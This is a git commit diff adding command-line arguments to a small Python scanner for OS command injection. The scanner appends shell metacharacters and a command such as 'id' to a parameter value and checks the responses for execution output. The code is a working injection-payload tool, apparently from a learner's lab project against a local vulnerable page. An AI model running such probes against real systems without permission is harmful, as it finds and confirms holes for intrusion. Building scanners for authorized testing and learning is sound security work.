6c652e8fd8867fb189131485b2907f858133cf39
pranav10780 <pranavsuresh107@gmail.com>
2025-05-28 17:09:25 +0530

    added command line arguments but still some bugs if command injection not found

--- scanner.py
+++ scanner.py
@@ -1,15 +1,34 @@
 import requests
-url = "http://localhost:8000/vuln.php"
-ip="127.0.0.1"
-cmd="ls /"
-shell_metacharacters = [';','|','&','&&','||','$','>','>>','<','`','$()','\\','*','?','~','(', ')','[', ']','\n','\r']
-outputs=['tmp','bin','boot','data','etc']
-print("[*] Scanning for command injection vulnerabilities...\n")
-for i in shell_metacharacters:
-    payload = ip + i + cmd
-    response = requests.get(url, params={'ip': payload})
-    for j in outputs:
-        if j in response.text:
+import argparse
+
+parser = argparse.ArgumentParser(description="PHPMap Scanner")
+parser.add_argument("-u", "--url", help="Specify url", required=True)
+parser.add_argument("-d", "--data", help="Specify valid data", required=True)
+parser.add_argument("-c", "--cmd", help="Specify malicious command (optional)", default="id")
+parser.add_argument("-o", "--outputs", help="Expected output indicators (optional)",default="uid") 
+
+args = parser.parse_args()
+
+url = args.url
+data = args.data
+cmd = args.cmd
+outputs = args.outputs
+
+shell_metacharacters = [';', '|', '&', '&&', '||', '$', '>', '>>', '<', '`', '$()', '\\', '*', '?', '~', '(', ')', '[', ']', '\n', '\r']
+
+try:
+    print("[*] Scanning for command injection vulnerabilities...\n")
+    for i in shell_metacharacters:
+        payload = data + i + cmd
+        try:
+            response = requests.get(url, params={'ip': payload},timeout=5)
+        except requests.exceptions.Timeout:
+            print(f"[!] Timeout with metacharacter '{i}' — skipping")
+            continue
+        
+        if outputs in response.text:
             print(f"[!!] Injection likely with metacharacter '{i}'")
             print(f"     Payload: {payload}")
             print("-" * 60)
+except KeyboardInterrupt:
+    print("\n[!] Scan interrupted by user. Exiting cleanly.")
